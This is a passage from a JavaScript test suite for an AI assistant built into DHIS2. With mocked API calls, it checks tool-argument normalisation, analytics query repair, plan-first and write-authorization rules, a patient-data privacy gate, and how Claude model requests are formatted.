  const tbPrompt = fs.readFileSync(path.join(ROOT, 'scripts/prompts/tb-workspace-1-app.txt'), 'utf8');
  truthy('plan-first: an app request listing "summary charts" and "warn before overwriting" is NOT a plan-first request', ctx.userAskedForPlanFirst(tbPrompt) === false);
  truthy('…"Show me the plan before creating anything" still is', ctx.userAskedForPlanFirst('Design and create a TB program with 4 stages. Show me the plan before creating anything.') === true);
  truthy('…"give me a summary first, then wait for my go" still is', ctx.userAskedForPlanFirst('Build a malaria dashboard. Give me a summary of what you will build first, then wait.') === true);
  truthy('…none of the six saved harness-test prompts is read as plan-first', ['maternal-journey-1-dashboard', 'tb-workspace-1-app', 'focus-explorer-1-plugin', 'ccr-1-program', 'ccr-2-dashboard', 'ccr-3-app-plugin'].every((f) => !ctx.userAskedForPlanFirst(fs.readFileSync(path.join(ROOT, `scripts/prompts/${f}.txt`), 'utf8'))));

  // 8. Line list: periods given on the org-unit column move to the time column (one call instead of a refusal and a retry).
  const ax = { columns: [{ dimension: 'ou', org_units: ['ImspTQPwCqd'], periods: ['202608', '202609', '202610'] }, { dimension: 'event_date' }, { dimension: 'qrur9Dvnyt5' }], filters: [] };
  const note8 = ctx.lineListMoveStrayPeriods(ax, 'EVENT');
  truthy('line list: periods on the ou column move to the event_date column, with a note', /moved to the "event_date" time column/.test(note8 || '') && JSON.stringify(ax.columns[1].periods) === '["202608","202609","202610"]' && !ax.columns[0].periods);
  const ax2 = { columns: [{ dimension: 'ou', org_units: ['ImspTQPwCqd'] }, { dimension: 'event_date', periods: ['LAST_12_MONTHS'] }], filters: [] };
  eq('…a list whose time column has its periods is left alone', [ctx.lineListMoveStrayPeriods(ax2, 'EVENT'), ax2.columns[1].periods], [null, ['LAST_12_MONTHS']]);

  // 10. The real fetch path trims analytics metaData (not only the helper): a 14,240-option breakdown.
  {
    const dd = vm.runInContext('dhis2', ctx);
    const keep = { base: dd.baseUrl, connected: dd.connected, apiVersion: dd.apiVersion, fetch: ctx.fetch };
    Object.assign(dd, { baseUrl: 'https://verify.example/dhis', connected: true, apiVersion: 43 });
    const bigBody = JSON.stringify({ headers: [{ name: 'K6uUAvq500H' }, { name: 'ou' }, { name: 'value' }], rows, height: rows.length, width: 3, metaData: meta });
    ctx.fetch = async (u) => (/analytics\/events\/aggregate/.test(String(u)) ? new Response(bigBody, { status: 200, headers: { 'Content-Type': 'application/json' } }) : new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } }));
    try {
      const got = await ctx.__realSafeDhis2Fetch('analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&dimension=K6uUAvq500H&filter=pe:202608');
      truthy(`safeDhis2Fetch: a 1.7 MB analytics answer comes back with 200 rows and metaData for those rows only (${JSON.stringify(got).length} chars)`, got && got._truncated && (got.rows || []).length === 200 && Object.keys(got.metaData.items).length < 260 && JSON.stringify(got).length < 60000);
    } finally { ctx.fetch = keep.fetch; Object.assign(dd, { baseUrl: keep.base, connected: keep.connected, apiVersion: keep.apiVersion }); }
  }

  // 11. Thematic map: a period DHIS2 dropped on save is an error and the map is deleted (the event path is checked above).
  {
    const dd = vm.runInContext('dhis2', ctx);
    const keep = { sdf: ctx.safeDhis2Fetch, wa: dd.writeAuth, base: dd.baseUrl, connected: dd.connected };
    Object.assign(dd, { baseUrl: 'https://verify.example/dhis', connected: true, writeAuth: { scope: 'broad', reason: 'verify' } });
    const calls11 = [];
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      calls11.push(`${o.method || 'GET'} ${p}`);
      if (/^programIndicators\.json\?filter=id:in:/.test(p)) return { programIndicators: [{ id: 'cW09nTtox14' }] };
      if (/^(?:indicators|dataElements)\.json/.test(p)) return {};
      if (/^programIndicators\/cW09nTtox14/.test(p)) return { id: 'cW09nTtox14', program: { id: 'eBAyeGv0exc' } };
      if (o.method === 'POST' && p === 'maps') return { response: { uid: o.body.id } };
      if (/^maps\/[^?]+\?fields=mapViews/.test(p)) return { mapViews: [{ layer: 'thematic', periods: [], filters: [{ dimension: 'pe', items: [] }], relativePeriods: {} }] };
      if (o.method === 'DELETE') return {};
      return {};
    };
    try {
      const r11 = await ctx.executeTool('manage_maps', { action: 'create', name: 'Deaths by district', data_item: 'cW09nTtox14', org_unit_level: 2, org_units: ['ImspTQPwCqd'], periods: ['202608', '202609', '202610'] });
      truthy('thematic map: saved without its period → an error, and the map is deleted again', r11._scope === 'map_period_dropped' && calls11.some(c => /^DELETE maps\//.test(c)) && !r11.success);
    } finally { ctx.safeDhis2Fetch = keep.sdf; Object.assign(dd, { writeAuth: keep.wa, baseUrl: keep.base, connected: keep.connected }); }
  }

  // 12. Data check: an indicator split by a category combination leaves out records with no age/sex;
  //     dates an indicator subtracts that sit years away from the tile's period are counted.
  {
    const keep = ctx.safeDhis2Fetch;
    const asked = [];
    ctx.safeDhis2Fetch = async (p) => {
      asked.push(p);
      if (/^programs\/eBAyeGv0exc\?fields=categoryMappings/.test(p)) return { categoryMappings: [
        { id: 'MapAge00001', mappingName: 'Morbidity Age', optionMappings: [{ filter: '#{Zj7UnCAulEk.qrur9Dvnyt5} < 1' }, { filter: '#{Zj7UnCAulEk.qrur9Dvnyt5} >= 1' }] },
        { id: 'MapSex00001', mappingName: 'Gender', optionMappings: [{ filter: "#{Zj7UnCAulEk.oZg33kd9taw} == 'Female'" }] }] };
      const nv = /filter=Zj7UnCAulEk\.(\w+):EQ:NV/.exec(p);
      if (nv) return { headers: [{ name: 'value' }], rows: [[nv[1] === 'qrur9Dvnyt5' ? '2' : '1']] };
      if (/eMyVanycQSC:NE:NV|msodh3rEMJa:NE:NV/.test(p)) return { headers: [{ name: 'value' }], rows: [['13802']] };
      if (/eMyVanycQSC:LT:|msodh3rEMJa:LT:/.test(p)) return { headers: [{ name: 'value' }], rows: [['13787']] };
      if (/:GT:/.test(p)) return { headers: [{ name: 'value' }], rows: [] };
      return {};
    };
    try {
      vm.runInContext('_dataCheckCache.clear()', ctx);
      const piSplit = { id: 'luLGbE2WKGP', displayName: 'Inpatient cases', program: { id: 'eBAyeGv0exc' }, categoryCombo: { id: 'xxFJla5TRH3', displayName: 'Morbidity Age and Gender' }, categoryMappingIds: ['MapAge00001', 'MapSex00001'], expression: 'V{event_count}' };
      const piStay = { id: 'lHX3zhXlcxC', displayName: 'Average stay', program: { id: 'eBAyeGv0exc' }, categoryCombo: { id: 'bjDvmb4bfuf', displayName: 'default' }, expression: 'd2:daysBetween(#{Zj7UnCAulEk.eMyVanycQSC}, #{Zj7UnCAulEk.msodh3rEMJa})', filter: '' };
      const tilesX = [{ tile: 'Total cases', items: [{ id: 'luLGbE2WKGP', indicator: piSplit }], pe: '202608;202609;202610', ou: 'ImspTQPwCqd' },
        { tile: 'Average stay', items: [{ id: 'lHX3zhXlcxC', indicator: piStay }], pe: '202608;202609;202610', ou: 'ImspTQPwCqd' }];
      const split = await ctx.dataCheckSplitIndicators(tilesX);
      eq('data check: a split indicator reports the records it leaves out (no age 2, no sex 1)', split.map(x => [x.indicator, x.split_by, x.left_out.map(l => `${l.field}:${l.records_without_value}`).sort().join(',')]), [['Inpatient cases', 'Morbidity Age and Gender', 'oZg33kd9taw:1,qrur9Dvnyt5:2']]);
      const far = await ctx.dataCheckDistantDates(tilesX);
      truthy('data check: dates an indicator subtracts that sit a year before the tile period are counted (13,787 of 13,802)', far.length === 2 && far.every(x => x.more_than_a_year_before === 13787 && x.records_with_date === 13802 && x.period === '2026-08-01 to 2026-10-31') && asked.some(p => /eMyVanycQSC:LT:2025-07-31/.test(p)));
      const lines = ctx.dataCheckReportLines(ctx.dataCheckAssemble([], [], [], split, far), []);
      truthy('…both appear in the lines printed under the answer', lines.some(l => /split by "Morbidity Age and Gender"/.test(l)) && lines.some(l => /13787 of 13802 records/.test(l) && /wrong year/.test(l)));
    } finally { ctx.safeDhis2Fetch = keep; vm.runInContext('_dataCheckCache.clear()', ctx); }
  }

  // 9. Claude adapter: current models reject sampling; thinking blocks go back unchanged with the tool results.
  eq('Claude adapter: temperature only for models that still accept it', ['claude-haiku-5-5', 'claude-sonnet-5-5', 'claude-opus-5-5', 'claude-opus-4-7', 'claude-sonnet-4-6', 'claude-haiku-4-5', 'claude-3-5-sonnet-20241022'].map(ctx.anthropicModelAcceptsSampling), [false, false, false, false, true, true, true]);
  const thinkingTurn = { role: 'assistant', content: null, tool_calls: [{ id: 'toolu_1', type: 'function', function: { name: 'search_metadata', arguments: '{"object_type":"programs"}' } }],
    _anthropic_content: [{ type: 'thinking', thinking: 'need programs', signature: 'sig==' }, { type: 'tool_use', id: 'toolu_1', name: 'search_metadata', input: { object_type: 'programs' } }] };
  const conv = ctx.convertMessagesToAnthropic([{ role: 'system', content: 'S' }, { role: 'user', content: 'list programs' }, thinkingTurn, { role: 'tool', tool_call_id: 'toolu_1', content: '{"programs":[]}' }]);
  const a = conv.messages[1];
  truthy('…the assistant turn goes back with its thinking block (and signature) first, then the tool_use', a.role === 'assistant' && a.content[0].type === 'thinking' && a.content[0].signature === 'sig==' && a.content[1].type === 'tool_use' && conv.messages[2].content[0].type === 'tool_result');
  // The stream parser keeps the blocks in order.
  const sse = [
    { type: 'content_block_start', index: 0, content_block: { type: 'thinking', thinking: '' } },
    { type: 'content_block_delta', index: 0, delta: { type: 'thinking_delta', thinking: 'plan' } },
    { type: 'content_block_delta', index: 0, delta: { type: 'signature_delta', signature: 'abc' } },
    { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'toolu_9', name: 'search_metadata', input: {} } },
    { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: '{"object_type":"programs"}' } },
    { type: 'message_delta', delta: { stop_reason: 'tool_use' } },
  ].map((e) => `data: ${JSON.stringify(e)}\n\n`).join('');
  const savedCfg = vm.runInContext('({ c: _cachedProviderConfig, k: _cachedApiKey })', ctx);
  const savedFetch9 = ctx.fetch;
  const savedBroadcast9 = ctx.broadcast;
  let sentBody = null;
  try {
    ctx.broadcast = () => {};
    vm.runInContext(`_cachedApiKey = 'k'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'anthropic', apiBaseUrl: 'https://api.anthropic.com', modelId: 'claude-haiku-5-5', temperature: 0.2 };`, ctx);
    ctx.fetch = async (u, o) => { sentBody = JSON.parse(o.body); return new Response(sse, { status: 200, headers: { 'Content-Type': 'text/event-stream' } }); };
    const out = await ctx.callAnthropicStreaming([{ role: 'system', content: 'S' }, { role: 'user', content: 'list programs' }], true, () => {}, [{ type: 'function', function: { name: 'search_metadata', description: 'd', parameters: { type: 'object', properties: {} } } }], 0);
    const msg = out.choices[0].message;
    truthy('…a Haiku 5.5 request carries no temperature', sentBody && !('temperature' in sentBody));
    truthy('…the streamed thinking block is kept with its signature, before the tool call', msg._anthropic_content && msg._anthropic_content[0].type === 'thinking' && msg._anthropic_content[0].thinking === 'plan' && msg._anthropic_content[0].signature === 'abc' && msg._anthropic_content[1].input.object_type === 'programs' && msg.tool_calls[0].function.name === 'search_metadata');
  } finally {
    ctx.fetch = savedFetch9;
    ctx.broadcast = savedBroadcast9;
    ctx.__restore9 = savedCfg; vm.runInContext('_cachedProviderConfig = __restore9.c; _cachedApiKey = __restore9.k;', ctx);
  }

  // 7. A tracker read the privacy gate REFUSED read nothing: it must not block the turn's settings writes.
  vm.runInContext(`_cachedApiKey = 'k'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' }; globalThis.__savedGetCfg2 = getProviderConfig; getProviderConfig = () => _cachedProviderConfig;`, ctx);
  const d7 = vm.runInContext('dhis2', ctx);
  const saved7 = { turn: d7.turnCounter, read: d7.patientDataReadTurn, tool: d7.patientDataReadTool, base: d7.baseUrl, connected: d7.connected };
  try {
    Object.assign(d7, { turnCounter: 41, patientDataReadTurn: null, baseUrl: 'https://verify.example/dhis', connected: true });
    const r = await ctx.executeTool('dhis2_query', { path: 'tracker/events?program=N7bpeUCYTbV&pageSize=5' });
    truthy('cloud model: the tracker read is refused by the privacy gate', r && r._privacy_block);
    eq('…and the refused read does not mark the turn as having read patient data', d7.patientDataReadTurn, null);
    eq('…so a settings write in the same turn is not blocked as patient data', ctx.dataStorePatientDataReason({ followUpDays: 14, sortBy: 'missing' }), null);
  } finally {
    vm.runInContext(`getProviderConfig = globalThis.__savedGetCfg2; _cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };`, ctx);
    Object.assign(d7, { turnCounter: saved7.turn, patientDataReadTurn: saved7.read, patientDataReadTool: saved7.tool, baseUrl: saved7.base, connected: saved7.connected });
  }
}

async function runArgumentShapeThreadChecks() {
  console.log('\nArgument shapes, tool crashes and switched-off tools (Malaria Testing and Treatment Review thread):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const d = vm.runInContext('dhis2', ctx);
  const saved = { sdf: ctx.safeDhis2Fetch, wa: d.writeAuth, base: d.baseUrl, connected: d.connected, apiVersion: d.apiVersion, exec: ctx.executeTool, fetch: ctx.fetch, broadcast: ctx.broadcast, hist: JSON.parse(JSON.stringify(vm.runInContext('conversationHistory', ctx))), pageContext: d.pageContext };
  Object.assign(d, { baseUrl: 'https://verify.example/dhis', connected: true, apiVersion: 42 });
  try {
    // 1. Every nested object a model fills in declares its fields on the wire.
    const FREE_FORM = new Set(['dhis2_query.body', 'dhis2_query.query_params', 'manage_program_notifications.patch', 'manage_datasets.patch']);
    const fieldless = [];
    const walk = (sch, p) => {
      if (!sch || typeof sch !== 'object') return;
      if (sch.type === 'object' && !sch.properties && !sch.additionalProperties && !FREE_FORM.has(p)) fieldless.push(p);
      if (sch.type === 'array' && !sch.items) fieldless.push(`${p} (list without items)`);
      if (sch.properties) for (const [k, v] of Object.entries(sch.properties)) walk(v, `${p}.${k}`);
      if (sch.items) walk(sch.items, `${p}[]`);
    };
    for (const t of vm.runInContext('TOOLS', ctx)) walk(t.function.parameters, t.function.name);
    eq('no tool parameter is an object or list without a field list (a constrained decoder writes lists inside one as {"item": …})', fieldless, []);
    const wire = vm.runInContext('toWireTools(TOOLS.filter(t => t.function.name === "manage_dashboards"))', ctx)[0].function.parameters;
    truthy('…new_visualization reaches the wire with its fields (data_items, periods, org_units, layout, overall_row)', ['data_items', 'periods', 'org_units', 'layout', 'overall_row'].every(k => wire.properties.items.items.properties.new_visualization.properties?.[k]));

    // 2. The exact arguments that crashed create_dashboard come out in the right shape.
    const crash = { action: 'create_dashboard', dashboard: { name: 'Malaria Testing and Treatment Review' }, items: [
      { new_visualization: { name: 'Total tests recorded', vis_type: 'SINGLE_VALUE', data_items: { item: 'JBg6UCsP4Zq' }, periods: { item: 'THIS_YEAR' }, org_units: { item: 'ImspTQPwCqd' } } },
      { new_visualization: { name: 'Treatment choices', vis_type: 'bar', data_items: { item: ['HyRTIlibfw2', 'jjP9uqdlAsZ'] }, periods: { item: 'THIS_YEAR' }, org_units: { item: 'ImspTQPwCqd' }, layout: { category: { item: 'dx' }, filters: { item: ['pe', 'ou'] } } } },
      { new_visualization: { name: 'District table', vis_type: 'PIVOT_TABLE', data_items: { item: ['JBg6UCsP4Zq'] }, periods: { item: 'THIS_YEAR' }, org_units: { item: ['ImspTQPwCqd', 'LEVEL-2'] }, overall_row: 'true', layout: { rows: { item: 'ou' }, columns: { item: 'dx' }, filters: { item: 'pe' } } } },
      { type: 'map', map_id: 'sE5EGukhe4B' } ] };
    const n = ctx.normalizeToolArgs('manage_dashboards', crash);
    const nv = (i) => n.value.items[i].new_visualization;
    eq('{"item": …} lists in an inline visualization are read as lists, "true" as true, a case slip of an enum fixed', [nv(0).data_items, nv(0).periods, nv(1).layout, n.value.items[3].type, nv(2).org_units, nv(2).overall_row, nv(2).layout.rows, n.problems.length],
      [['JBg6UCsP4Zq'], ['THIS_YEAR'], { category: ['dx'], filters: ['pe', 'ou'] }, 'MAP', ['ImspTQPwCqd', 'LEVEL-2'], true, ['ou'], 0]);
    const m = ctx.normalizeToolArgs('manage_maps', { action: 'create', org_unit_level: '2', period: ['THIS_YEAR'], org_units: 'ImspTQPwCqd', thematic_map_type: 'choropleth' }).value;
    eq('…map arguments: "2" → 2, ["THIS_YEAR"] → "THIS_YEAR", one org unit → a list, "choropleth" → CHOROPLETH', [m.org_unit_level, m.period, m.org_units, m.thematic_map_type], [2, 'THIS_YEAR', ['ImspTQPwCqd'], 'CHOROPLETH']);
    const body = ctx.normalizeToolArgs('dhis2_query', { path: 'metadata', method: 'POST', body: { visualizations: { item: [{ name: 'x', columnDimensions: { item: 'dx' } }] } }, query_params: { dimension: { item: ['ou:ImspTQPwCqd', 'pe:THIS_YEAR'] } } }).value;
    eq('…free-form bodies and query parameters: {"item": …} → a list at any depth', [Array.isArray(body.body.visualizations), body.body.visualizations[0].columnDimensions, body.query_params.dimension], [true, ['dx'], ['ou:ImspTQPwCqd', 'pe:THIS_YEAR']]);
    const ds = ctx.normalizeToolArgs('dhis2_query', { path: 'dataStore/ns/key', method: 'PUT', body: { item: { a: 1 } } }).value;
    eq('…a dataStore value is the user\'s own JSON and is left as sent', ds.body, { item: { a: 1 } });
    const blocked = ctx.normalizeToolArgs('manage_dashboards', { action: 'create_dashboard', dashboard: { name: { a: 1, b: 2 } }, items: [{ new_visualization: { name: 'x', data_items: { a: 'x', b: 'y' } } }] }).problems.filter(p => p.blocking);
    const refusal = ctx.argumentShapeRefusal('manage_dashboards', blocked);
    truthy('an object where text or a list of ids belongs is refused before anything runs, naming each argument; the panel shows it as "correcting"',
      blocked.length === 2 && /dashboard\.name must be text/.test(refusal._error) && /items\[0\]\.new_visualization\.data_items must be a list/.test(refusal._error) && ctx.toolOutcomeKind(refusal) === 'harness_correcting');
    eq('a comma list stays text for the tool to read (not split by the dispatcher)', ctx.normalizeToolArgs('search_metadata', { object_type: 'dataElements', filters: 'a:eq:1,b' }).value.filters, 'a:eq:1,b');

    // 3. Query parameters never reach the URL as [object Object].
    eq('{"item": […]} query parameters become one parameter each', ctx.appendQueryParamsToPath('analytics/events/aggregate/p', { dimension: { item: ['ou:A', 'B.C'] }, stage: 'S' }), 'analytics/events/aggregate/p?dimension=ou%3AA&dimension=B.C&stage=S');
    eq('…an object with several fields is reported', ctx.queryParamsShapeProblems({ dimension: { ou: 'A', pe: 'B' }, stage: 'S' }), ['dimension']);
    const sent = [];
    ctx.fetch = async (u) => { sent.push(String(u)); return new Response('{}', { status: 200 }); };
    d.writeAuth = { scope: 'read_only', reason: 'verify' };
    const qp = await ctx.executeTool('dhis2_query', { path: 'analytics/events/aggregate/bMcwwoVnbSR', query_params: { dimension: { ou: 'ImspTQPwCqd', pe: 'THIS_YEAR' } } });
    const obj = await ctx.__realSafeDhis2Fetch('analytics/events/aggregate/bMcwwoVnbSR?dimension=[object Object]');
    truthy('dhis2_query refuses such a parameter and the transport refuses any URL holding "[object Object]" — nothing is sent', qp._scope === 'argument_shape' && /"dimension"/.test(qp._error) && obj._scope === 'argument_shape' && sent.length === 0);

    // 4. Hand-written analytics objects: every way round is closed.
    const posts = [];
    ctx.safeDhis2Fetch = async (p, o = {}) => { posts.push(`${o.method || 'GET'} ${p}`); return { status: 'OK' }; };
    d.writeAuth = { scope: 'broad', reason: 'verify' };
    const keyed = await ctx.executeTool('dhis2_query', { path: 'metadata', method: 'POST', body: { visualizations: { mT1a7xKq9Bd: { name: 'x' } } } });
    const items = await ctx.executeTool('dhis2_query', { path: 'dashboardItems', method: 'POST', body: { type: 'TEXT', text: 'x' } });
    const made = await ctx.executeTool('dhis2_query', { path: 'dashboards/malariaTTR01', method: 'PUT', body: { name: 'x', dashboardItems: [] } });
    truthy('POST metadata with visualizations keyed by id, POST dashboardItems and PUT dashboards/<made-up id> are refused and sent to manage_dashboards; nothing is written',
      [keyed, items, made].every(r => /^Blocked/.test(r._error || '') && r._redirect === 'manage_dashboards') && !posts.some(p => /^(?:POST|PUT)/.test(p)));

    // 4b. Analytics periods and org units as a model guesses them (verified 2.42.7).
    const h = (u) => ctx.healAnalyticsPeriodAndOrgUnitParams(u);
    const bareDates = h('analytics/events/aggregate/bMcwwoVnbSR?dimension=ou:ImspTQPwCqd&dimension=pe&stage=kO3z4Dhc038&startDate=2024-01-01&endDate=2026-12-31');
    const bareWithParam = h('analytics/events/aggregate/bMcwwoVnbSR?dimension=pe&dimension=ou:ImspTQPwCqd&stage=kO3z4Dhc038&periods=LAST_12_MONTHS');
    const aggParam = h('analytics?dimension=dx:SWEIWH5VuTj&dimension=ou:ImspTQPwCqd&periods=THIS_YEAR');
    const evParam = h('analytics/events/aggregate/bMcwwoVnbSR?dimension=ou:ImspTQPwCqd&stage=kO3z4Dhc038&period=THIS_YEAR');
    const noOu = h('analytics/events/aggregate/bMcwwoVnbSR?dimension=pe:THIS_YEAR&stage=kO3z4Dhc038');
    const enrFilter = h('analytics/enrollments/aggregate/IpHINAT79UW?filter=ou:ImspTQPwCqd&dimension=pe:THIS_YEAR');
    const aggNoPe = h('analytics?dimension=dx:SWEIWH5VuTj&dimension=ou:ImspTQPwCqd');
    const evNoPe = h('analytics/events/aggregate/bMcwwoVnbSR?dimension=ou:ImspTQPwCqd&stage=kO3z4Dhc038');
    const fine = h('analytics?dimension=dx:SWEIWH5VuTj&dimension=ou:ImspTQPwCqd&filter=pe:THIS_YEAR');
    truthy('a bare pe dimension is refused with the forms that work, or filled from a period= parameter beside it',
      bareDates.refusal?._scope === 'analytics_period_needed' && /dimension=pe:LAST_12_MONTHS&dimension=ou:ImspTQPwCqd/.test(bareWithParam.path) && !/periods=/.test(bareWithParam.path));
    truthy('period= / periods= (no such parameter: a 409 on /analytics, silently ignored by event analytics) become filter=pe:…',
      /&filter=pe:THIS_YEAR$/.test(aggParam.path) && !/periods=/.test(aggParam.path) && /filter=pe:THIS_YEAR/.test(evParam.path) && !/period=/.test(evParam.path) && /ignored/.test(evParam.notes[0]));
    truthy('no org unit → dimension=ou:USER_ORGUNIT; an org-unit FILTER on enrollment aggregate (SQL 42601) becomes a dimension',
      /dimension=ou:USER_ORGUNIT/.test(noOu.path) && /dimension=ou:ImspTQPwCqd/.test(enrFilter.path) && !/filter=ou/.test(enrFilter.path));
    truthy('/analytics with no period is refused before sending; event analytics without one is sent with a note that DHIS2 answers the last 12 months; a correct query is untouched',
      aggNoPe.refusal?._scope === 'analytics_period_needed' && !evNoPe.healed && /last 12 months/.test(evNoPe.notes[0] || '') && fine.healed === false && fine.notes.length === 0);
    // 4c. A guessed collection name goes to the collection the server has.
    const savedIdx = ctx.getSchemaIndex;
    const idx = new Map();
    for (const e of [{ name: 'organisationUnit', plural: 'organisationUnits' }, { name: 'organisationUnitLevel', plural: 'organisationUnitLevels' }, { name: 'dataElement', plural: 'dataElements' }, { name: 'dataStore', plural: 'dataStores' }]) { idx.set(e.name.toLowerCase(), e); idx.set(e.plural.toLowerCase(), e); }
    ctx.getSchemaIndex = async () => idx;
    const col = async (u) => (await ctx.healCollectionPath(u)).path;
    eq('orgUnits / organizationUnitLevels / dataElement / dataelements → the real collection; a real name, dataStore and analytics are untouched',
      [await col('orgUnits?fields=id&filter=level:eq:2'), await col('organizationUnitLevels'), await col('dataElement/abc'), await col('dataelements'), await col('organisationUnits?fields=id'), await col('dataStore/ns/key'), await col('analytics?dimension=dx:a')],
      ['organisationUnits?fields=id&filter=level:eq:2', 'organisationUnitLevels', 'dataElements/abc', 'dataElements', 'organisationUnits?fields=id', 'dataStore/ns/key', 'analytics?dimension=dx:a']);
    ctx.getSchemaIndex = savedIdx;

    // 4c'. Hand-written reads of a program review (Child Programme, 2026-11-17).
    {
      const pde = ctx.healProgramDataElementsQuery('programDataElements?filter=program.id:eq:IpHINAT79UW&fields=id,displayName', null);
      const pdeCtx = ctx.healProgramDataElementsQuery('programDataElements?fields=id', 'IpHINAT79UW');
      const pdeNone = ctx.healProgramDataElementsQuery('programDataElements?fields=id', null);
      truthy('programDataElements gets its program as program=<uid> (from a filter or the page\'s program); with none known it is refused before a 400',
        /^programDataElements\?program=IpHINAT79UW&fields=id%2CdisplayName$/.test(pde.path) && /^programDataElements\?program=IpHINAT79UW&fields=id$/.test(pdeCtx.path) && pdeNone.refusal?._scope === 'known_endpoint_guidance');
      const moved = ctx.normalizeToolArgs('dhis2_query', { path: 'analytics/events/aggregate/IpHINAT79UW', query_params: { dimension: { item: [['dx:A03MvHHogjR.bx6fsa0t90x']] }, item: [['pe:LAST_12_MONTHS'], ['ou:ImspTQPwCqd']], stage: 'A03MvHHogjR' } }).value.query_params;
      eq('dimensions written under a sibling "item" key move into dimension (DHIS2 has no item= parameter)', moved, { dimension: ['dx:A03MvHHogjR.bx6fsa0t90x', 'pe:LAST_12_MONTHS', 'ou:ImspTQPwCqd'], stage: 'A03MvHHogjR' });
      const savedVal = ctx.validateProgramRuleCondition; const checked = [];
      ctx.validateProgramRuleCondition = async (c, pid) => { checked.push([c, pid]); return { status: 'OK', message: 'Valid', description: 'x' }; };
      d.writeAuth = { scope: 'read_only', reason: 'the user asked for no changes' };
      ctx.safeDhis2Fetch = async (p2, o = {}) => ({ _error: `unexpected ${o.method || 'GET'} ${p2}` });
      const rc = await ctx.executeTool('dhis2_query', { path: 'programRules/condition/description', query_params: { condition: "#{apgarscore} < 0", programId: 'IpHINAT79UW' } });
      const rc2 = await ctx.executeTool('dhis2_query', { path: 'programRules/condition/description?programId=IpHINAT79UW', method: 'POST', body: { condition: '#{apgarscore} >= 0' } });
      ctx.safeDhis2Fetch = async (p2) => (/^programRules\/NAgjOfWMXg6\?/.test(p2) ? { id: 'NAgjOfWMXg6', condition: '#{apgarscore} > 7', program: { id: 'IpHINAT79UW' } } : { _error: 'unexpected' });
      const rc3 = await ctx.executeTool('dhis2_query', { path: 'programRules/NAgjOfWMXg6/condition/description', query_params: { fields: 'condition' } });
      ctx.validateProgramRuleCondition = savedVal;
      truthy('a rule-condition check sent as GET, or as POST with a JSON body, runs as the POST with a text body — also on a read-only turn (it saves nothing)',
        rc.message === 'Valid' && rc2.message === 'Valid' && rc3.message === 'Valid' && JSON.stringify(checked) === JSON.stringify([['#{apgarscore} < 0', 'IpHINAT79UW'], ['#{apgarscore} >= 0', 'IpHINAT79UW'], ['#{apgarscore} > 7', 'IpHINAT79UW']]));
      d.writeAuth = { scope: 'broad', reason: 'verify' };
    }

    // 4c''. Org-unit levels and plan-first turns.
    {
      const savedLevels = d.orgLevelNames;
      d.orgLevelNames = [{ level: 1, name: 'National' }, { level: 2, name: 'District' }, { level: 3, name: 'Chiefdom' }, { level: 4, name: 'Facility' }];
      ctx.safeDhis2Fetch = async (p2) => (/^organisationUnits\?filter=id:in:/.test(p2) ? { organisationUnits: [{ id: 'YuQRtpLP10I', displayName: 'Badjia', level: 3 }, { id: 'O6uvpzGd5pu', displayName: 'Bo', level: 2 }].filter(u => p2.includes(u.id)) } : {});
      const deep = await ctx.analyticsOrgUnitLevelRefusal('analytics?dimension=dx:Uvn6LCg7dVU&dimension=ou:YuQRtpLP10I;LEVEL-2&filter=pe:2025');
      const at = await ctx.analyticsOrgUnitLevelRefusal('analytics?dimension=dx:Uvn6LCg7dVU&dimension=ou:O6uvpzGd5pu;LEVEL-2&filter=pe:2025');
      truthy('ou:<chiefdom>;LEVEL-2 is refused before its 409, naming the unit\'s level and USER_ORGUNIT;LEVEL-2; a unit at the level itself is sent',
        deep?._scope === 'analytics_ou_level' && /Badjia \(YuQRtpLP10I\) is level 3 \(Chiefdom\)/.test(deep._error) && /USER_ORGUNIT;LEVEL-2/.test(deep._hint) && at === null);
      d.orgLevelNames = savedLevels;
      const pf = ctx.userAskedForPlanFirst;
      eq('plan-first requests are recognised; ordinary build requests are not',
        [pf('Design and create a tracker program for TB. Show me the plan before creating anything.'), pf('Build and install an app … show me a short summary before installing'), pf('Show me the field mapping before you place it.'), pf('List what you find and propose fixes, but do not change anything yet.'), pf('Create a dashboard called X and give me the link.'), pf('Show me the dashboard')],
        [true, true, true, true, false, false]);
      const cw = (t) => { const r = ctx.classifyWriteAuthorization(t); return `${r.scope}${r.planFirst ? '+plan' : ''}`; };
      eq('a plan-first request writes nothing in its first turn, whatever verbs it has; the approval turn authorizes',
        [cw('Design and create a tracker program for TB case follow-up … Show me the plan before creating anything.'), cw('Build and install a DHIS2 app … show me a short summary before installing, and give me the app link.'), cw('Add a form-field plugin … Show me the field mapping before you place it.'), cw('Create a dashboard called X for the Malaria program and give me the link.'), cw('Yes, the plan looks good. Create it.'), cw('Looks good, yes install it.')],
        ['read_only+plan', 'read_only+plan', 'read_only+plan', 'broad', 'broad', 'broad']);
      const savedText = vm.runInContext('lastUserText', ctx); const savedWa = d.writeAuth; const savedStreak = d.consecutiveDiscoveryCalls;
      d.writeAuth = { scope: 'read_only', planFirst: true, reason: 'verify' };
      vm.runInContext(`lastUserText = ${JSON.stringify('Design and create a TB program. Show me the plan before creating anything.')};`, ctx);
      d.consecutiveDiscoveryCalls = 12;
      const early = ctx.discoveryStreakStopOrNull('search_metadata', { object_type: 'optionSets' });
      d.consecutiveDiscoveryCalls = 20;
      const late = ctx.discoveryStreakStopOrNull('search_metadata', { object_type: 'optionSets' });
      truthy('on a plan-first turn the research limit is 20 and the stop says "write the plan, create nothing" (never "issue the write now")',
        early === null && late && /plan first/.test(late._error) && /Create, install or place nothing this turn/.test(late._hint) && !/Issue the actual write/.test(late._hint));
      d.writeAuth = { scope: 'read_only', reason: 'the user asked for no changes' };
